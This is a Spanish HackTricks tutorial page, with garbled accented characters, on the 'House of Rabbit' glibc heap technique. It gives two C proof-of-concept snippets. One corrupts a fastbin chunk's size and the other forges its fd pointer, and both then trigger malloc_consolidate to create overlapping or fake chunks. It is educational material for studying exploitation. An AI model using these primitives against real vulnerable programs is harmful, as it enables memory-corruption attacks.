# Casa del Conejo

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipo Rojo de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

### Requisitos

1. **Capacidad para Modificar el Puntero fd o el Tama침o de Fastbin**: Esto significa que puedes cambiar el puntero forward de un fragmento en el fastbin o su tama침o.
2. **Capacidad para Desencadenar `malloc_consolidate`**: Esto se puede hacer ya sea asignando un fragmento grande o fusionando el fragmento superior, lo que obliga al mont칩n a consolidar fragmentos.

### Objetivos

1. **Crear Fragmentos Superpuestos**: Para que un fragmento se solape con otro, permitiendo manipulaciones adicionales del mont칩n.
2. **Forjar Fragmentos Falsos**: Para enga침ar al asignador para que trate un fragmento falso como un fragmento leg칤timo durante las operaciones del mont칩n.

## Pasos del Ataque

### POC 1: Modificar el Tama침o de un Fragmento Fastbin

**Objetivo**: Crear un fragmento superpuesto manipulando el tama침o de un fragmento fastbin.

* **Paso 1: Asignar Fragmentos**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Paso 2: Liberar Chunks**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **Paso 3: Modificar el Tama침o del Chunk**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **Paso 4: Desencadenar `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Asignar un gran fragmento desencadena la funci칩n `malloc_consolidate`, fusionando fragmentos peque침os en el fastbin. El tama침o manipulado de `chunk1` hace que se solape con `chunk2`.

Despu칠s de la consolidaci칩n, `chunk1` se solapa con `chunk2`, lo que permite una mayor explotaci칩n.

### POC 2: Modificar el Puntero FD

**Objetivo**: Crear un fragmento falso manipulando el puntero fd del fastbin.

* **Paso 1: Asignar Fragmentos**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Explicaci칩n**: Asignamos dos fragmentos, uno m치s peque침o y otro m치s grande, para configurar el mont칩n para el fragmento falso.

* **Paso 2: Crear Fragmento Falso**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **Paso 3: Liberar el Chunk1**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Explicaci칩n**: Liberamos `chunk1`, a침adi칠ndolo a la lista fastbin.

* **Paso 4: Modificar FD de Chunk1**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Explicaci칩n**: Cambiamos el puntero hacia adelante (fd) de `chunk1` para que apunte a nuestro chunk falso dentro de `chunk2`.

* **Paso 5: Desencadenar `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Al asignar nuevamente un gran fragmento se activa `malloc_consolidate`, que procesa el fragmento falso.

El fragmento falso se convierte en parte de la lista fastbin, convirti칠ndose en un fragmento leg칤timo para futuras explotaciones.

### Resumen

La t칠cnica de la **Casa del Conejo** implica modificar el tama침o de un fragmento fastbin para crear fragmentos superpuestos o manipular el puntero fd para crear fragmentos falsos. Esto permite a los atacantes forjar fragmentos leg칤timos en el mont칩n, lo que habilita diversas formas de explotaci칩n. Comprender y practicar estos pasos mejorar치 tus habilidades de explotaci칩n de mont칩n.
